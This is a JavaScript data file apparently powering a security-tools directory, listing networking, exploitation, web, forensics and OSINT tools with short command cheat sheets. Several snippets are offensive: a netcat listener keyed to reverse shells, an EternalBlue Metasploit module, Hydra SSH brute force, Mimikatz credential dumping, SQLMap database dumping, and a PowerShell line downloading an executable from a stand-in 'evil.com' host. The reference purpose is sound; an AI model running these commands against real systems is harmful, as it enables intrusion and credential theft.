const toolsData = [
    // Featured / AI
    {
        title: "✨ Security Prompt Builder",
        category: "AI",
        description: "Generate optimized prompts for LLMs (ChatGPT, Claude) to assist in Red/Blue team tasks.",
        link: "prompt-builder.html",
        featured: true
    },
    {
        title: "KaliGPT",
        category: "AI",
        description: "AI-powered assistant for Kali Linux / penetration testing tasks.",
        keywords: "kaligpt ai artificial intelligence security assistant"
    },

    // Networking
    {
        title: "Netcat (nc)",
        category: "Networking",
        description: "The 'Swiss Army knife' of networking. Used for reading/writing data across network connections.",
        keywords: "netcat nc network listener reverse shell",
        flags: "<strong># Listen on port 4444</strong>\nnc -lvnp 4444\n\n<strong># Connect to a port</strong>\nnc -v <target_ip> <port>\n\n<strong># File Transfer (Receiver)</strong>\nnc -lvnp 1234 > received_file"
    },
    {
        title: "Nmap",
        category: "Networking",
        description: "Network exploration tool and security / port scanner.",
        keywords: "nmap network scanner reconnaissance",
        flags: "<strong># Aggressive Scan</strong>\nnmap -A -v <target_ip>\n\n<strong># Scan specific ports</strong>\nnmap -p 80,443,8080 <target_ip>\n\n<strong># Scan all ports</strong>\nnmap -p- <target_ip>"
    },
    {
        title: "Wireshark",
        category: "Networking",
        description: "The world's foremost network protocol analyzer.",
        keywords: "wireshark network analyzer packet capture pcap",
        flags: "<strong># Filter by IP</strong>\nip.addr == 192.168.1.10\n\n<strong># Filter by Protocol</strong>\nhttp || dns\n\n<strong># Follow TCP Stream</strong>\nRight-click packet -> Follow -> TCP Stream"
    },
    {
        title: "Tcpdump",
        category: "Networking",
        description: "Command-line packet analyzer.",
        keywords: "tcpdump pcap packet capture cli",
        flags: "<strong># Capture to file</strong>\ntcpdump -i eth0 -w capture.pcap\n\n<strong># Read from file</strong>\ntcpdump -r capture.pcap"
    },

    // Exploitation
    {
        title: "Metasploit Framework",
        category: "Exploitation",
        description: "The world's most used penetration testing framework.",
        keywords: "metasploit framework msfconsole exploit",
        flags: "<strong># Start Console</strong>\nmsfconsole\n\n<strong># Search for module</strong>\nsearch type:exploit eternalblue\n\n<strong># Use module</strong>\nuse exploit/windows/smb/ms17_010_eternalblue"
    },
    {
        title: "Searchsploit",
        category: "Exploitation",
        description: "Command line search tool for Exploit-DB.",
        keywords: "searchsploit exploitdb exploit database",
        flags: "<strong># Search for exploit</strong>\nsearchsploit apache 2.4\n\n<strong># Mirror exploit</strong>\nsearchsploit -m <id>"
    },
    {
        title: "Hydra",
        category: "Exploitation",
        description: "A very fast network logon cracker which supports many different services.",
        keywords: "hydra brute force password cracker",
        flags: "<strong># SSH Brute Force</strong>\nhydra -l user -P passlist.txt ssh://192.168.1.10"
    },
    {
        title: "John the Ripper",
        category: "Exploitation",
        description: "Fast password cracker, currently available for many flavors of Unix, Windows, DOS, and OpenVMS.",
        keywords: "john ripper password cracker hash",
        flags: "<strong># Crack hash file</strong>\njohn --wordlist=/usr/share/wordlists/rockyou.txt hash.txt"
    },
    {
        title: "Hashcat",
        category: "Exploitation",
        description: "World's fastest password recovery tool.",
        keywords: "hashcat gpu password cracking",
        flags: "<strong># Crack MD5 (Mode 0)</strong>\nhashcat -m 0 -a 0 hash.txt rockyou.txt"
    },
    {
        title: "Mimikatz",
        category: "Exploitation",
        description: "A little tool to play with Windows security (extract plaintexts passwords, hash, PIN code and kerberos tickets).",
        keywords: "mimikatz windows credentials lsass",
        flags: "<strong># Dump Creds</strong>\nprivilege::debug\nsekurlsa::logonpasswords"
    },
    {
        title: "Evil-WinRM",
        category: "Exploitation",
        description: "The ultimate WinRM shell for hacking/pentesting.",
        keywords: "winrm windows remote management shell",
        flags: "<strong># Connect</strong>\nevil-winrm -i <ip> -u <user> -p <pass>"
    },
    {
        title: "Responder",
        category: "Exploitation",
        description: "LLMNR, NBT-NS and MDNS poisoner.",
        keywords: "responder man in the middle ntlm poisoning",
        flags: "<strong># Start Responder</strong>\nsudo responder -I eth0 -dwv"
    },

    // Web
    {
        title: "Burp Suite",
        category: "Web",
        description: "An integrated platform for performing security testing of web applications.",
        keywords: "burp suite web proxy scanner intercept",
        flags: "<strong># Intercept</strong>\nProxy -> Intercept -> Intercept is on\n\n<strong># Repeater</strong>\nCtrl+R to send request to Repeater."
    },
    {
        title: "Gobuster",
        category: "Web",
        description: "Directory/File, DNS and VHost busting tool written in Go.",
        keywords: "gobuster directory dns vhost brute force",
        flags: "<strong># Directory Scan</strong>\ngobuster dir -u http://example.com -w list.txt\n\n<strong># VHost Scan</strong>\ngobuster vhost -u http://example.com -w list.txt"
    },
    {
        title: "SQLMap",
        category: "Web",
        description: "Automatic SQL injection and database takeover tool.",
        keywords: "sqlmap sql injection database takeover",
        flags: "<strong># Basic Scan</strong>\nsqlmap -u 'http://site.com/id=1' --dbs\n\n<strong># Dump DB</strong>\nsqlmap -u '...' -D dbname --dump"
    },
    {
        title: "WPScan",
        category: "Web",
        description: "WordPress security scanner.",
        keywords: "wpscan wordpress scanner vulnerability",
        flags: "<strong># Enumerate Users</strong>\nwpscan --url http://blog.com -e u"
    },
    {
        title: "FFUF",
        category: "Web",
        description: "Fast web fuzzer written in Go.",
        keywords: "ffuf fuzzer web directory",
        flags: "<strong># Fuzz Directory</strong>\nffuf -u http://site.com/FUZZ -w wordlist.txt"
    },

    // Forensics
    {
        title: "Volatility",
        category: "Forensics",
        description: "Advanced memory forensics framework.",
        keywords: "volatility memory forensics ram analysis",
        flags: "<strong># Image Info</strong>\nvolatility -f mem.dmp imageinfo\n\n<strong># PsList</strong>\nvolatility -f mem.dmp --profile=<profile> pslist"
    },
    {
        title: "Autopsy",
        category: "Forensics",
        description: "The premier open source digital forensics platform. GUI for The Sleuth Kit.",
        keywords: "autopsy digital forensics sleuth kit"
    },
    {
        title: "FTK Imager",
        category: "Forensics",
        description: "Data preview and imaging tool. Used to acquire memory and disk images.",
        keywords: "ftk imager disk imaging forensics"
    },
    {
        title: "Ghidra",
        category: "Forensics",
        description: "A software reverse engineering (SRE) suite of tools developed by NSA.",
        keywords: "ghidra reverse engineering nsa disassembler"
    },

    // OSINT
    {
        title: "Sherlock",
        category: "OSINT",
        description: "Hunt down social media accounts by username across social networks.",
        keywords: "sherlock osint username search social media",
        flags: "<strong># Search Username</strong>\npython3 sherlock.py username"
    },
    {
        title: "Maltego",
        category: "OSINT",
        description: "Open source intelligence and forensics application. It offers visual link analysis.",
        keywords: "maltego osint link analysis graph"
    },
    {
        title: "TheHarvester",
        category: "OSINT",
        description: "Gather emails, subdomains, hosts, employee names, open ports and banners.",
        keywords: "theharvester osint emails subdomains",
        flags: "<strong># Basic Search</strong>\ntheHarvester -d example.com -b all"
    },
    {
        title: "Shodan",
        category: "OSINT",
        description: "Search engine for Internet-connected devices.",
        keywords: "shodan iot search engine"
    },

    // Misc / Lists
    {
        title: "Sysinternals Suite",
        category: "Forensics",
        description: "Essential Windows troubleshooting utilities (ProcMon, ProcExp, Autoruns, PsExec).",
        keywords: "sysinternals procmon procexp autoruns windows"
    },
    {
        title: "PowerShell",
        category: "Networking",
        description: "Task automation and configuration management framework. Often used for LOLBAS attacks.",
        keywords: "powershell lolbas scripting windows",
        flags: "<strong># Download File</strong>\nInvoke-WebRequest -Uri 'http://evil.com/file.exe' -OutFile 'C:\\Temp\\file.exe'"
    },
    {
        title: "CyberChef",
        category: "Web",
        description: "The Cyber Swiss Army Knife - a web app for encryption, encoding, compression and data analysis.",
        keywords: "cyberchef decoding encoding crypto magic"
    },
    {
        title: "Other Tools (Index)",
        category: "Index",
        description: "Comprehensive list of other security tools.",
        keywords: "list of other tools unclassified socat ssh openvpn tcpdump tshark zeek snort suricata nagios zscaler proxmox kubernetes docker owasp zap caido feroxbuster dirb nikto whatweb evilginx2 gophish masscan rustscan enum4linux adguard dnsrecon nslookup dig whois amass crackmapexec netexec impacket rekall grr kape zimmerman tools exiftool binwalk strings floss pestudio holehe phoneinfoga waybackurls gowitness ai terminal autohotkey tmux duplicati flameshot",
        isIndex: true
    }
];
